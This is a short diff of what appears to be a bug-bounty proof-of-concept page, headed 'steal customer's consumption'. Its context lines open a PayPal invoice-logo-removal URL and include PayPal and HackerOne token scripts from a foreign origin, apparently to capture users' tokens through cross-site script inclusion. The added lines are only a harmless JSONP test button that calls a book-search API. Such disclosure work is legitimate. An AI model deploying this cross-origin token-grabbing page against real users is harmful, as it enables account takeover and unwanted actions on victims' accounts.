@@ -45,8 +45,20 @@ steal customer's consumption
 	    }
 	});
 	window.open("https://www.paypal.com/invoice/logo/remove")
+	window.onload = function() {
+
+	    var oBtn = document.getElementById('btn');
+
+	    oBtn.onclick = function() {     
+
+		var script = document.createElement("script");
+		script.src = "https://api.douban.com/v2/book/search?q=javascript&count=1&callback=handleResponse";
+		document.body.insertBefore(script, document.body.firstChild);   
+	    };
+	};
 </script>
 <script src="https://www.paypal.com/auth/createchallenge/f77e4df7782eb734/recaptchav3.js?_sessionID="></script>
 <script src="https://hackerone.com/current_user/graphql_token.js"></script>
 <a href="https://hackerone.com/johnstone">hacker1 johnstone</a>
+	<button id="btn">测试Jsonp</button>
 </html>
